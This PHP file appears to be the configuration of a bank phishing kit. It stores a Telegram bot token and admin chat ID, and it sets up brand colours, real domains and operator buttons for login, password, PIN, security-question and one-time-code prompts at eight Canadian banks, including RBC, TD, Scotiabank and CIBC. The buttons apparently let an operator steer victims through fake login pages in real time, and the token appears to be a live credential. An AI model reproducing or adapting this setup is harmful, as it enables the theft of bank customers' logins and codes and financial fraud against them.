<?php
/**
 * config.php - Configuration for the login redirect-and-loader system.
 * It includes Telegram bot credentials and bank-specific settings.
 */

// Telegram Bot API credentials (replace with your actual bot token and admin chat ID)
$BOT_TOKEN     = '6278639566:AAFOIuW6Gjd53XTJJSQUoWu83j9bQ540Th8';    // e.g., 123456789:ABCDefGhIjKlMnOpQrStUvWxYz
$ADMIN_CHAT_ID = '-1002651242191';      // Chat ID (or channel ID) where admin notifications are sent

// Define branding and inline button options for each supported Canadian bank.
$BANKS = [
    'rbc' => [
        'name'          => 'Royal Bank of Canada (RBC)',
        'color'         => '#005DAA',  // RBC primary brand blue
        'redirect_base' => 'rbcroyalbank.com',  // Base domain for redirects (e.g., RBC's site)
        'actions'       => [ // Inline button labels for RBC's typical flow
            'Correct password',
            'Incorrect password',
            'Security question',
            'Swipe to approve',
            'Resend PIN',
            'Email code',
            'Incorrect security code',
            'Timeout',
            // (RBC e-Transfer deposit flow not typical, so 'Deposit success' omitted here)
        ]
    ],
    'td' => [
        'name'          => 'TD Canada Trust (TD)',
        'color'         => '#54B848',  // TD primary green
        'redirect_base' => 'td.com',
        'actions'       => [ // TD flow might not use mobile app approval, so 'Swipe to approve' omitted
            'Correct password',
            'Incorrect password',
            'Security question',
            'Resend PIN',
            'Email code',
            'Incorrect security code',
            'Timeout',
            'Deposit success'
        ]
    ],
    'scotiabank' => [
        'name'          => 'Scotiabank',
        'color'         => '#D81F26',  // Scotiabank red
        'redirect_base' => 'scotiabank.com',
        'actions'       => [ // Scotiabank could include all options
            'Correct password',
            'Incorrect password',
            'Security question',
            'Resend PIN',
            'Email code',
            'Incorrect security code',
            'Timeout',
            'Deposit success'
            // (Assume no app "swipe to approve" for Scotiabank)
        ]
    ],
    'bmo' => [
        'name'          => 'Bank of Montreal (BMO)',
        'color'         => '#0079C1',  // BMO blue
        'redirect_base' => 'bmo.com',
        'actions'       => [ // BMO might use security questions and codes, include most options
            'Correct password',
            'Incorrect password',
            'Security question',
            'Resend PIN',
            'Email code',
            'Incorrect security code',
            'Timeout',
            'Deposit success'
            // (No mobile app approval in this example)
        ]
    ],
    'cibc' => [
        'name'          => 'Canadian Imperial Bank of Commerce (CIBC)',
        'color'         => '#B00B1C',  // CIBC deep red
        'redirect_base' => 'cibc.com',
        'actions'       => [ // CIBC often uses 2FA codes rather than security questions
            'Correct password',
            'Incorrect password',
            'Resend PIN',
            'Email code',
            'Incorrect security code',
            'Timeout',
            'Deposit success'
            // (Security questions and app approval omitted for CIBC in this example)
        ]
    ],
    'nbc' => [
        'name'          => 'National Bank of Canada',
        'color'         => '#E20D18',  // National Bank red
        'redirect_base' => 'nbc.ca',
        'actions'       => [ // National Bank might use similar flows
            'Correct password',
            'Incorrect password',
            'Resend PIN',
            'Email code',
            'Incorrect security code',
            'Timeout',
            'Deposit success'
            // (Assume no security questions or app approval here)
        ]
    ],
    'tangerine' => [
        'name'          => 'Tangerine',
        'color'         => '#FFA800',  // Tangerine orange
        'redirect_base' => 'tangerine.ca',
        'actions'       => [ // Tangerine typically uses verification codes
            'Correct password',
            'Incorrect password',
            'Resend PIN',
            'Email code',
            'Incorrect security code',
            'Timeout',
            'Deposit success'
            // (Security question not used by Tangerine, omitted)
        ]
    ],
    'simplii' => [
        'name'          => 'Simplii Financial',
        'color'         => '#D30D85',  // Simplii magenta (after 2023 rebrand)
        'redirect_base' => 'simplii.com',
        'actions'       => [ // Simplii uses codes via SMS/Email
            'Correct password',
            'Incorrect password',
            'Resend PIN',
            'Email code',
            'Incorrect security code',
            'Timeout',
            'Deposit success'
            // (Security question not typically used by Simplii)
        ]
    ]
];
?>